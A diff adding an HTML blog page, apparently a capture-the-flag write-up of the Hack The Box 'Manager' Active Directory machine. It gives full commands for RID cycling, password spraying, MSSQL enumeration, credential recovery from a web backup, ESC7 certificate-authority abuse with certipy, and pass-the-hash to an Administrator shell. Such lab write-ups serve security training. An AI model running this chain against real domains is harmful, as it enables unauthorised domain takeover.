@@ -1,0 +1,402 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="color-scheme" content="dark">
+
+  <title>Hack The Box: Manager · blackhawk0x</title>
+  <meta name="description" content="Manager">
+
+  <link rel="icon" href="data:,">
+  <link rel="stylesheet" href="/assets/css/main.css">
+
+  <link type="application/atom+xml" rel="alternate" href="http://localhost:4000/feed.xml" title="blackhawk0x" />
+  <!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>Hack The Box: Manager | blackhawk0x</title>
+<meta name="generator" content="Jekyll v3.10.0" />
+<meta property="og:title" content="Hack The Box: Manager" />
+<meta name="author" content="blackhawk0x" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Manager" />
+<meta property="og:description" content="Manager" />
+<link rel="canonical" href="http://localhost:4000/posts/manager/" />
+<meta property="og:url" content="http://localhost:4000/posts/manager/" />
+<meta property="og:site_name" content="blackhawk0x" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2026-10-26T00:00:00+05:30" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="Hack The Box: Manager" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"blackhawk0x"},"dateModified":"2026-10-26T00:00:00+05:30","datePublished":"2026-10-26T00:00:00+05:30","description":"Manager","headline":"Hack The Box: Manager","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/posts/manager/"},"url":"http://localhost:4000/posts/manager/"}</script>
+<!-- End Jekyll SEO tag -->
+
+</head>
+
+<body>
+  <header class="site-head">
+    <div class="site-head__inner shell">
+      <a href="/" class="wordmark" aria-label="blackhawk0x home">
+        blackhawk<span class="dot">0x</span>
+      </a>
+
+      <nav class="nav" aria-label="Main navigation">
+        <a href="/htb/" class="nav__link">htb</a>
+        <a href="/tags/" class="nav__link">topics</a>
+        <a href="/about/" class="nav__link">about</a>
+      </nav>
+    </div>
+  </header>
+
+  <main class="shell">
+    <article>
+  <header class="post-head">
+    <h1 class="post-title">Hack The Box: Manager</h1>
+    <p class="post-meta">
+      2026.10.26
+      
+        &nbsp;·&nbsp;
+        <a class="row__tag" href="/tags/#rid-cycling">RID Cycling</a>, <a class="row__tag" href="/tags/#mssql">MSSQL</a>, <a class="row__tag" href="/tags/#esc7">ESC7</a>
+      
+    </p>
+  </header>
+  <div class="post-content">
+    <h1 id="manager">Manager</h1>
+
+<p>Manager is a Windows Active Directory machine that demonstrates how exposed backup files, weak credentials, and misconfigured Active Directory Certificate Services (AD CS) can combine into a complete domain compromise.</p>
+
+<p>The initial foothold comes from credentials recovered from a website backup. From there, the path to Administrator involves abusing the CA’s <code class="language-plaintext highlighter-rouge">ManageCa</code> permission through <strong>ESC7</strong>.</p>
+
+<h2 id="1-enumeration">1. Enumeration</h2>
+
+<p>Start with a full TCP port scan and service detection.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmap -p- --min-rate 1000 -oN ports.txt TARGET_IP
+nmap -sC -sV -p &lt;OPEN_PORTS&gt; -oN services.txt TARGET_IP
+</code></pre></div></div>
+
+<p>The scan identifies several Windows and Active Directory services, including:</p>
+
+<ul>
+  <li>
+    <p>DNS (53)</p>
+  </li>
+  <li>
+    <p>HTTP (80)</p>
+  </li>
+  <li>
+    <p>Kerberos (88)</p>
+  </li>
+  <li>
+    <p>LDAP (389, 636)</p>
+  </li>
+  <li>
+    <p>SMB (445)</p>
+  </li>
+  <li>
+    <p>Microsoft SQL Server (1433)</p>
+  </li>
+  <li>
+    <p>WinRM (5985)</p>
+  </li>
+  <li>
+    <p>Active Directory Global Catalog (3268, 3269)</p>
+  </li>
+</ul>
+
+<p>The web service runs Microsoft IIS, while the other exposed services suggest that the target is an Active Directory domain controller.</p>
+
+<p>Add the domain and hostname to <code class="language-plaintext highlighter-rouge">/etc/hosts</code>.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>echo "TARGET_IP manager.htb dc01.manager.htb" | sudo tee -a /etc/hosts
+</code></pre></div></div>
+
+<h2 id="2-smb-enumeration-and-rid-cycling">2. SMB Enumeration and RID Cycling</h2>
+
+<p>Anonymous SMB access reveals the available shares, but attempting to browse <code class="language-plaintext highlighter-rouge">NETLOGON</code> and <code class="language-plaintext highlighter-rouge">SYSVOL</code> does not provide access.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>smbclient -N -L //TARGET_IP/
+</code></pre></div></div>
+
+<p>Use Impacket’s <code class="language-plaintext highlighter-rouge">lookupsid.py</code> to enumerate domain accounts through SID lookups.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>impacket-lookupsid 'anonymous@manager.htb' -dc-ip TARGET_IP
+</code></pre></div></div>
+
+<p>Among the discovered users are <code class="language-plaintext highlighter-rouge">Zhong</code>, <code class="language-plaintext highlighter-rouge">Cheng</code>, <code class="language-plaintext highlighter-rouge">Ryan</code>, <code class="language-plaintext highlighter-rouge">Raven</code>, <code class="language-plaintext highlighter-rouge">JinWoo</code>, <code class="language-plaintext highlighter-rouge">ChinHae</code>, and <code class="language-plaintext highlighter-rouge">Operator</code>.</p>
+
+<p>Save the usernames to a file and check whether any accounts are vulnerable to AS-REP roasting.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>impacket-GetNPUsers manager.htb/ \
+  -dc-ip TARGET_IP \
+  -usersfile users.list \
+  -request
+</code></pre></div></div>
+
+<p>The discovered accounts do not yield a usable AS-REP roast in this attempt, so continue with other authentication avenues.</p>
+
+<h2 id="3-discovering-weak-credentials">3. Discovering Weak Credentials</h2>
+
+<p>Test the discovered usernames against SMB using simple username-matching passwords.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nxc smb TARGET_IP -u users.list -p users.list
+</code></pre></div></div>
+
+<p>The successful credential pair is:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Username: operator
+Password: operator
+</code></pre></div></div>
+
+<p>These credentials provide authenticated access to SMB and are also accepted by the MSSQL service.</p>
+
+<h2 id="4-mssql-enumeration">4. MSSQL Enumeration</h2>
+
+<p>Connect to SQL Server using Windows authentication.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>impacket-mssqlclient operator@TARGET_IP -windows-auth
+</code></pre></div></div>
+
+<p>Once connected, use <code class="language-plaintext highlighter-rouge">xp_dirtree</code> to enumerate accessible directories on the server.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>SQL (MANAGER\Operator  guest@master)&gt; xp_dirtree C:\
+</code></pre></div></div>
+
+<p>The web root is particularly interesting:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>SQL (MANAGER\Operator  guest@master)&gt; xp_dirtree C:\inetpub\wwwroot
+</code></pre></div></div>
+
+<p>Among the website files is a backup archive:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>website-backup-27-07-23-old.zip
+</code></pre></div></div>
+
+<p>This is a useful lead: backup files often retain configuration values that should never have been exposed through a web server.</p>
+
+<h2 id="5-recovering-credentials-from-the-website-backup">5. Recovering Credentials from the Website Backup</h2>
+
+<p>Download the archive from the web server.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wget http://manager.htb/website-backup-27-07-23-old.zip -O web.zip
+unzip web.zip -d website-backup
+</code></pre></div></div>
+
+<p>Inspect the extracted configuration files, especially <code class="language-plaintext highlighter-rouge">.old-conf.xml</code>.</p>
+
+<p>The configuration contains LDAP connection details and credentials belonging to the domain user <code class="language-plaintext highlighter-rouge">raven</code>.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;user&gt;raven@manager.htb&lt;/user&gt;
+&lt;password&gt;&lt;REDACTED&gt;&lt;/password&gt;
+</code></pre></div></div>
+
+<p>The credentials recovered from the backup work for Raven’s WinRM access.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>evil-winrm -i TARGET_IP -u raven -p '&lt;REDACTED&gt;'
+</code></pre></div></div>
+
+<p>This provides a remote PowerShell session as Raven.</p>
+
+<h3 id="user-flag">User flag</h3>
+
+<p>The user flag is obtained from Raven’s session. Its value is intentionally redacted in this public writeup.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>type C:\Users\Raven\Desktop\user.txt
+</code></pre></div></div>
+
+<h2 id="6-enumerating-active-directory-certificate-services">6. Enumerating Active Directory Certificate Services</h2>
+
+<p>With authenticated access as Raven, enumerate the domain’s certificate authority and certificate templates.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>certipy-ad find \
+  -u 'raven@manager.htb' \
+  -p '&lt;REDACTED&gt;' \
+  -dc-ip TARGET_IP \
+  -dc-host dc01.manager.htb \
+  -target-ip TARGET_IP \
+  -stdout -enabled -vulnerable
+</code></pre></div></div>
+
+<p>The output identifies the certificate authority:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>CA Name: manager-DC01-CA
+</code></pre></div></div>
+
+<p>More importantly, Raven has the <code class="language-plaintext highlighter-rouge">**ManageCa**</code> permission on the CA.</p>
+
+<p>This permission allows Raven to manage the certificate authority, including issuing pending certificate requests. Combined with the ability to enable the <code class="language-plaintext highlighter-rouge">SubCA</code> template, this creates an ESC7 privilege-escalation path.</p>
+
+<h2 id="7-exploiting-esc7">7. Exploiting ESC7</h2>
+
+<p>ESC7 involves excessive certificate authority management permissions. In this scenario, Raven can add themselves as a CA officer, enable the <code class="language-plaintext highlighter-rouge">SubCA</code> template, and manually issue a certificate request that the CA initially denies.</p>
+
+<h3 id="71-add-raven-as-a-ca-officer">7.1 Add Raven as a CA officer</h3>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>certipy-ad ca \
+  -ca 'manager-DC01-CA' \
+  -add-officer raven \
+  -u 'raven@manager.htb' \
+  -p '&lt;REDACTED&gt;' \
+  -dc-ip TARGET_IP \
+  -dc-host dc01.manager.htb \
+  -target-ip TARGET_IP
+</code></pre></div></div>
+
+<h3 id="72-enable-the-subca-template">7.2 Enable the SubCA template</h3>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>certipy-ad ca \
+  -ca 'manager-DC01-CA' \
+  -enable-template SubCA \
+  -u 'raven@manager.htb' \
+  -p '&lt;REDACTED&gt;' \
+  -dc-ip TARGET_IP \
+  -dc-host dc01.manager.htb \
+  -target-ip TARGET_IP
+</code></pre></div></div>
+
+<h3 id="73-request-a-certificate-for-administrator">7.3 Request a certificate for Administrator</h3>
+
+<p>Request a certificate using the <code class="language-plaintext highlighter-rouge">SubCA</code> template while specifying the Administrator UPN.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>certipy-ad req \
+  -u 'raven@manager.htb' \
+  -p '&lt;REDACTED&gt;' \
+  -ca 'manager-DC01-CA' \
+  -template SubCA \
+  -upn 'administrator@manager.htb' \
+  -dc-ip TARGET_IP
+</code></pre></div></div>
+
+<p>The request is created, but the CA initially returns:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>CERTSRV_E_TEMPLATE_DENIED
+</code></pre></div></div>
+
+<p>The denial does not end the attack. The request has been submitted and has a request ID, allowing the CA officer to issue it manually.</p>
+
+<p>Record the request ID from your own output; in this run, it was <code class="language-plaintext highlighter-rouge">21</code>.</p>
+
+<h3 id="74-issue-the-denied-request">7.4 Issue the denied request</h3>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>certipy-ad ca \
+  -u 'raven@manager.htb' \
+  -p '&lt;REDACTED&gt;' \
+  -ca 'manager-DC01-CA' \
+  -issue-request 21 \
+  -dc-ip TARGET_IP
+</code></pre></div></div>
+
+<p>The CA successfully issues the pending request.</p>
+
+<h3 id="75-retrieve-the-certificate">7.5 Retrieve the certificate</h3>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>certipy-ad req \
+  -u 'raven@manager.htb' \
+  -p '&lt;REDACTED&gt;' \
+  -ca 'manager-DC01-CA' \
+  -template SubCA \
+  -retrieve 21 \
+  -dc-ip TARGET_IP
+</code></pre></div></div>
+
+<p>Certipy saves the resulting certificate as <code class="language-plaintext highlighter-rouge">administrator.pfx</code>.</p>
+
+<h2 id="8-authenticate-as-administrator">8. Authenticate as Administrator</h2>
+
+<p>Use the issued certificate to authenticate and retrieve the Administrator account’s NTLM hash.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>certipy-ad auth \
+  -pfx administrator.pfx \
+  -dc-ip TARGET_IP
+</code></pre></div></div>
+
+<p>The output provides an NTLM hash for Administrator. The actual hash is intentionally omitted.</p>
+
+<p>Authenticate to WinRM using the recovered hash:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>evil-winrm -i TARGET_IP \
+  -u administrator \
+  -H '&lt;REDACTED_NTLM_HASH&gt;'
+</code></pre></div></div>
+
+<p>This provides an Administrator shell on the target.</p>
+
+<h3 id="root-flag">Root flag</h3>
+
+<p>The root flag is obtained from the Administrator session. Its value is intentionally redacted.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>type C:\Users\Administrator\Desktop\root.txt
+</code></pre></div></div>
+
+<h2 id="attack-chain-summary">Attack Chain Summary</h2>
+
+<ol>
+  <li>
+    <p>Enumerate exposed Windows and Active Directory services.</p>
+  </li>
+  <li>
+    <p>Use RID cycling to discover domain accounts.</p>
+  </li>
+  <li>
+    <p>Find weak credentials for <code class="language-plaintext highlighter-rouge">operator</code>.</p>
+  </li>
+  <li>
+    <p>Authenticate to MSSQL and enumerate the IIS web root.</p>
+  </li>
+  <li>
+    <p>Download the website backup and recover Raven’s credentials.</p>
+  </li>
+  <li>
+    <p>Access the host through WinRM as Raven.</p>
+  </li>
+  <li>
+    <p>Identify the CA’s excessive <code class="language-plaintext highlighter-rouge">ManageCa</code> permission.</p>
+  </li>
+  <li>
+    <p>Abuse ESC7 by enabling <code class="language-plaintext highlighter-rouge">SubCA</code> and manually issuing an Administrator certificate request.</p>
+  </li>
+  <li>
+    <p>Authenticate with the certificate, recover the Administrator NTLM hash, and obtain a privileged WinRM session.</p>
+  </li>
+</ol>
+
+  </div>
+</article>
+
+  </main>
+
+  <footer class="foot">
+    <div class="foot__inner shell">
+      <div class="foot__bar">
+        <p class="foot__id">
+          <span class="foot__brand">blackhawk0x</span>
+          <span class="foot__role">Security · Systems · Notes</span>
+        </p>
+
+        <div class="foot__navs">
+          <nav class="foot__group" aria-label="Site links">
+            <a class="foot__link" href="/about/">about</a>
+          </nav>
+
+          <nav class="foot__group" aria-label="External profiles">
+            
+              <a class="foot__link" href="https://github.com/blackhawk0x" rel="me noopener noreferrer">github</a>
+            
+            
+            
+              <span class="foot__dot" aria-hidden="true">·</span>
+              <a class="foot__link" href="mailto:lalitkandpallalit@gmail.com">email</a>
+            
+            <span class="foot__dot" aria-hidden="true">·</span>
+            <a class="foot__link" href="https://www.linkedin.com/in/lalit-kandpal/" rel="me noopener noreferrer">linkedin</a>
+          </nav>
+
+          <nav class="foot__group" aria-label="Site resources">
+            <a class="foot__link" href="/sitemap.xml">sitemap</a>
+          </nav>
+        </div>
+      </div>
+    </div>
+  </footer>
+</body>
+</html>
